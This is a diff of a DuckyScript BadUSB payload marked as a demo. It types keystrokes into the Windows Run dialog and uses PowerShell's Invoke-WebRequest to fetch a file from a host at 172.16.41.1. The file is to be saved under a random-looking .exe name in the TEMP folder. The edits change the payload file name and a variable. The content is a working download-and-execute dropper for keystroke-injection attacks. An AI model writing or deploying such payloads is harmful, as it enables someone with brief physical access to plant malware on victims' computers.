@@ -1,4 +1,4 @@
-REM BadUSB demo: whoami
+REM BadUSB demo
 
 DELAY 1000
 GUI r
@@ -8,7 +8,7 @@ DELAY 500
 ENTER
 DELAY 1000
 
-STRING $url  = "http://172.16.41.1:8000/config.tmp"
+STRING $url  = "http://172.16.41.1:8000/config_vmware.tmp"
 ENTER
 DELAY 100
 
@@ -20,7 +20,7 @@ STRING $exe  = "$env:TEMP\2fd19d11-d4b7-46d1-94db-7edd16980d15.exe"
 ENTER
 DELAY 100
 
-STRING Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
+STRING Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing
 ENTER
 DELAY 100
 
